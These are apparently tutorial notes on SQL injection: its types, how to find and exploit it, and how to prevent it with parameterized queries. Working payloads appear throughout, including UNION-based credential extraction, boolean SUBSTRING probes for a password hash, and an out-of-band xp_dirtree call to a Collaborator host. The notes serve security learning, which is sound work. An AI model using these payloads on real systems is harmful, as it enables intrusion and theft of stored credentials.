# Summary

- `Video`: https://youtu.be/1nJgupaUPEQ?list=PLuyTk2_mYISLaZC4fVqDuW_hOk0dd5rlf
- `Cheat Sheet - Invicti`: https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#SyntaxBasicAttacks
- `What is SQL Injection?` - Definition, Types, How Common
- `How do we find it?` - From both Black-box and White-box prospective
- `How to exploit it?` - exploit the vulnerabitity in order to gain access to the system or server
- `How to prevent it?` - Recomandation and best practices


## SQL Injection?

- Vulnerability that consists of an attacker `interfering with the SQL queriess that an application makes to a backend database`.
- If an attacker can manage to interact and change the sql query by adding sql characters or sql code in a input vector(parameter/field) of an application, then the application is definitely vulnerable to SQL Injection.
![Demo](https://portswigger.net/web-security/images/sql-injection.svg)
- We can test these input vector field for sql injection vulnerabilities to see those inputs are porperly validated or not

## Impact of SQL Injection Attacks

- Unauthorized access to sensitive data
  - `Confidentiality` - SQLi can be used to view sensitive information, such as application username and password
  - `Integrity` - SQLi can be used to alter the data in the database
  - `Availabilty` - SQLi can be used to delete data in the database
- Remote code execution on the operating system - 
  - Attacker would gain access to the operating system with same privilege that the database is running with. So, developers have to be more careful in term of making sure that the database is run with the least privilege policy.
  
## Types of SQL Injection
- `In-band(Classic)` -- `Error` based and `Union` based
  - are ones where the attacker uses the `same communication channel` to both launch the attack and gather results of the attack.
  - `Error based`: force the database to generate an error to give attacker more information about how things operate at the backend. Eg, Version of the database, exact sql queries, etc
  - `Union based`: Technique that leverages property of the union operation to combine the results of two queries into a single result set. In this technique, that attacker not only just output the result of original query that the application makes but also output the result of query of attacker's choice.
- `Inferential(Blind)` -- `Boolean` and `Time` based
  - `Boolean based`: In this there is no actual transfer of data via the web application, so we don't see the result in the application's response. Instead we are suck to ask the application True or False questions
  - `Time based`: Causing the databse to pause for specified period of time in order to determine if what we are asking the application/databse is correct or not.
  - Impact is as bad as classic or in-band sql injection.
- `Out-of-Band` SQLi
  - This occur when attacker unable to use the same communication channel to launch the attack and gather the results of the attack. It usually relies on the abilty of the application to make a network connection, e.g, DNS or HTTP request to deliver data to an attacker controlled server.
  - Out-of-band SQL Injection (OOB SQLi) is a type of SQL Injection attack where an attacker is able to extract data from a database using a secondary channel. Unlike traditional SQLi attacks, which retrieve data directly from the web application's response, OOB SQLi attacks utilize features such as DNS, SMTP or HTTP requests to exfiltrate data from the database server. This makes OOB SQLi a useful technique for bypassing firewalls or web application security measures that may block or limit direct communication between the attacker and the database. To prevent OOB SQLi, it is important to properly validate and sanitize user inputs, and to properly configure firewalls and `security measures to block or limit outbound communication from the database server`.

## In-band SQL Injection
- occurs when the attacker uses the `same communication channel` to both launch the attack and gather results of the attack.
  - Retrieved data is presented directly in the application web page.
- Easier to exploit than the other categories of SQLi.
- Two common types of in-band SQLi
  - Error-based SQLi
  - Union-based SQLi
  
 ### Error-based SQLi
 - Error based SQLi is an in-band SQLi technique that forces the database to generate an error, giving the attacker information upon which to refine their injection and help developing an injection payload.
 - Example:
 
Input:
 ```
 www.random.com/app.php?id='
 ```
 
Output:
    
 ```
 You have an error in your SQL syntax, check the manual that corresponds to your MYSQL server version..
 ```
 
 ### Union-based SQLi
 - It is an in-band SQLi technique that leverages the UNION SQL operator to combind the results of two queries into a single result set.
  - Example:
 
Input:
 ```
 www.random.com/app.php?id=' UNION SELECT username, password FROM users--
 ```
 
Output:
    
 ```
carlos
afibh9cjnkuwcsfobs7h
administrator
tn8f921skp5dzoy7hxpk
 ```
- UNION operator has certain conditions for it to work 

## Inferential (Blind) SQL Injection
- SQLi vulnerability where there is no actual transfer of data via the web 
application which forces the attacker to steal data by asking the database a series of True abd False questions
- Just as dangerous as in-band SQL injection
 - Attacker able to reconstruct the information by sending particular requests
and observing the resulting behavior of the DB Server.
- Takes longer and good skillset to exploit than in-band SQL injection
- Two common types of blind SQLi 
  - Boolean-based SQLi
  - Time-based SQLi
  
 ### Boolean-Based Blind SQLi
 - Boolean-based SQLi is a blind SQLi technique that uses Boolean conditions to return a different result depending on whether the query returns a TRUE or FALSE result
 
 Example URL:
 ``` 
 http://www.random.com/app.php?id=1
 ```
Backend Query:
```
select title from product where id =1
```
Payload #1 (False):
```
 http://www.random.com/app.php?id=1 and 1=2
```
Backend Query:
```
select title from product where id =1 and 1=2 
```
Payload #2 (True):
```
http://www.random.com/app.php?id=1 and 1=1
```
Backend Query:
```
select title from product where id =1 and 1=1

```
- If the application response differently in True vs False payload, then it is vulnerable to Boolean based blind SQLi.

- How to use the above True or False to deduce --> 

Users Table:
```
Administrator / e3c33e889e0e1b62cb7f65c63b60c42bd77275d0e730432fc37b7e624b09ad1f
```
Payload:
```
www.random.com/app.php?id=1 and SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'
```
Backend Query:
```
select title from product where id =1 and SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'
```

=> Nothing is returned on the page => Returned False => s’ is NOT the first character of the hashed password

Payload:
```
www.random.com/app.php?id=1 and SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'e'
```
Backend Query:
```
select title from product where id =1 and SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'e'
```
=> Title of product id 1 is returned on the page => Returned True => e’ IS the first character of the hashed password

### Time-Based Blind SQLi
- Time-based SQLi is a blind SQLi technique that relies on the database pausing for a specified amount of time, then returning the results, indicating a successful SQL query execution.
- Example Query:
If the first character of the administrator’s hashed password is an ‘a’, wait for 10 seconds.
  - response takes 10 seconds → first letter is 'a'
  -  response doesn’t take 10 seconds → first letter is not ‘a’

## Out-of-Band (OAST) SQLi
- OAST - Out-of-band Application Security Testing
- Vulnerability that consists of triggering an out-of-band network 
connection to a system that attacker control.
  - Not common
  - A variety of protocols can be used (ex. DNS, HTTP)
- Example Payload:
```
'; exec master..xp_dirtree'//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```


---

# HOW TO FIND SQLI VULNERABILITIES?

## Finding SQLi Vulnerabilities

- Depends on the perspective of testing.
  - Black Box Testing
  - White Box Testing

## Black-Box Testing Perspective
- Map the application
  - Visit URL of the application
  - Walk through all the pages accessible within the user context 
  - Make note of all input vectors that potentially talk to the backend
  - Try to understand how the application functions
  - Try to figure out login of the application
  - Try to figure out the subdomains in the applications
  - Enumerate directories and pages that might not be directly visible through the application
  - And so on.
  -  `While doing that keeps burp proxy listenig silently and intercepting all the requests that we are making into the application`
- Fuzz the application
  - Submit SQL-specific characters such as ' or ", and look for errors or other anomalies
  - Submit Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses
  - Submit payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond
  - Submit OAST(out-of-band) payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitor for any resulting interactions

## White-Box Testing Perspective
- Enable web server logging
  - to understand generated invalid error character that we input into the application and help to detect a SQL injection exists.
  - Help to refine our payload
- Enable database logging
  - depending on how error is logged at backend we can see what characters made it through and what format they made it through.
  - Then we can predict how much percent input vector is vulnerable to SQLi before looking at the source code.
- Map the application
  - Visible functionality in the application
    - Make list of input vector talked to backend database and mapped it through code functionalities and check for vulnerabilities.
  - Regex search on all instances in the code that talk to the database
- Code review!
  - Follow the code path for all input vectors
- Test any potential SQLi vulnerabilities

---

# HOW TO EXPLOIT SQLI VULNERABILITIES?

## Exploiting Error-Based SQLi
- Submit SQL-specific characters such as `'` or `"`, and look for errors or other anomalies
- Different characters can give you different errors

## Exploiting Union-Based SQLi
- There are two rules for combining the result sets of two queries by 
using `UNION`:
  - The number and the order of the columns must be the same in all queries
  - The data types must be compatible
  
- Exploitation:
  - Figure out the number of columns that the query is making
    - Determining the number of columns required in an SQL injection UNION 
attack using `ORDER BY`: 
      - `select title, cost from product where id =1 order by 1`
      - Incrementally inject a series of ORDER BY clauses until you get an error or observe a different behaviour in the application 
      ```
      order by 1--
      order by 2--
      order by 3--
      ```
      - `The ORDER BY position number 3 is out of range of the number of items in the select list.`
    - Determining the number of columns required in an SQL injection UNION attack using `NULL VALUES`:
      - `select title, cost from product where id =1 UNION SELECT NULL--`
      - Incrementally inject a series of UNION SELECT payloads specifying a different number of null values until you no longer get an error
      - `' UNION SELECT NULL--`
      - `All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`
        ```
        ' UNION SELECT NULL--
        ' UNION SELECT NULL, NULL--
        ```

  - Figure the data types of the columns (mainly interested in string data)
    - Finding columns with a useful data type in an SQL injection UNION attack:
      - Probe each column to test whether it can hold string data by submitting a series of `UNION SELECT` payloads that place a string value into each column in turn
      - `' UNION SELECT 'a',NULL--`
      - `Conversion failed when converting the varchar value 'a' to data type int.`
      ```
      ' UNION SELECT 'a',NULL--
      ' UNION SELECT NULL,'a'--
      ```
   
  - Use the UNION operator to output information from the database

## Exploiting Boolean-Based Blind SQLi
- Submit a Boolean condition that evaluates to `False` and note the response
- Submit a Boolean condition that evaluates to `True` and note the response
- Write a program that uses conditional statements to ask the database a 
series of True / False questions and monitor response

## Exploiting Time-Based Blind SQLi
- Submit a payload that pauses the application for a specified period of time
- Write a program that uses conditional statements to ask the database a 
series of TRUE / FALSE questions and monitor response time

## Exploiting Out-of-Band SQLi
- Submit OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitor for any resulting interactions
- Depending on SQL injection use different methods to exfil data
- `Exfiltration` = The unauthorized transfer of information from an information system
- `"Exfiltrate"` in the context of Out-of-Band SQL Injection refers to the process of extracting or removing data from a database and sending it outside the system.

---

# Automated Exploitation Tools
- Sqlmap - https://github.com/sqlmapproject/sqlmap
- Web Application Vulnerability Scanners (WAVS) 
  - Burp suite
  - Owasp ZAP
  - Wapiti
  - Netsparker(Invicti)
  - arachni
  - acunetix

---

# HOW TO PREVENT SQLI VULNERABILITIES?

## Preventing SQLi Vulnerabilities

- Primary Defenses:
  - Option 1: Use of Prepared Statements (Parameterized Queries) [Full Protection]
    - Code vulnerable to SQLi:
    ```java
    String query = "SELECT account_balance FROM user_data WHERE user_name = " + request.getParameter("customerName");
    try {
        Statement statement = connection.createStatement(...);
        ResultSet results = statement.executeQuery( query );
    }
    ```
    - Spot the issue?
      - User supplied input `cutomerName` is embedded directly into the SQL statement
      - The construction of the SQL statement is performed in two steps:
        - The application specifies the query's structure with placeholders for each user input
        - The application specifies the content of each placeholder
      - Code not vulnerable to SQLi:
      ```java
      // This should REALLY be validated too
      String custname = request.getParameter("customerName");
      // Perform input validation to detect attacks
      String query = "SELECT account_balance FROM user_data WHERE user_name = ? ";
      PreparedStatement pstmt = connection.prepareStatement( query );
      pstmt.setString(1, custname);
      ResultSet results = pstmt.executeQuery();
      
      ```

  - Option 2: Use of Stored Procedures (Partial)
    - A stored procedure is a batch of statements grouped together and stored in the database 
    - Not always safe from SQL injection, still need to be called in a parameterized way
  - Option 3: Whitelist Input Validation (Partial)
    - Defining what values are authorized. Everything else is considered unauthorized
    - Useful for values that cannot be specified as parameter placeholders, such as the table name.
  - Option 4: Escaping All User Supplied Input (Partial)
    - Should be only used as a last resort
  
- Additional Defenses:
  - `Defense in Depth`: It is idea to make attack as difficult as possible for the attacker to compromise the organization and that's done by providing additional protection in the event that frontline defenses fail.
  - Also: Enforcing Least Privilege
    - The application should use the lowest possible level of privileges when accessing the database
    - Any unnecessary default functionality in the database should be removed or disabled 
      - Functions that allows to execute system commands from the database
      - Functions that allows to make network connection (out-of-band SQLi)
    - Ensure CIS benchmark for the database in use is applied
      - There are rules to configure for database to be secured, follow that banchmark for your database.
    - All vendor-issued security patches should be applied in a timely fashion
  - Also: Performing Whitelist Input Validation as a Secondary Defense
    - Already discussed
    
---

# Resources
- Web Security Academy - SQL Injection
  - https://portswigger.net/web-security/sql-injection
- Web Application Hacker’s Handbook
  - Chapter 9 - Attacking Data Stores
- OWASP – SQL Injection
  - https://owasp.org/www-community/attacks/SQL_Injection
- OWASP – SQL Prevention Cheat Sheet
  - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- PentestMonkey – SQL Injection 
  - http://pentestmonkey.net/category/cheat-sheet/sql-injection
